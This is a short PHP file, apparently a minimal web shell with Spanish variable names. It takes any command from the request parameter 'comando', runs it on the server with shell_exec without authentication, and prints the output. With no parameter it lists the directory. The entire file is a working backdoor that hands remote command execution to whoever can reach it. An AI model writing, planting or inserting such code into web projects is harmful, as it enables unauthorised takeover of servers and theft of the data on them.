<?php
if(isset($_REQUEST['comando'])) {
	$salida = shell_exec($_REQUEST['comando']);
	echo "<pre>$salida</pre>";
}else{	
	$salida = shell_exec('ls -l');
	echo "<pre>$salida</pre>";
}
?>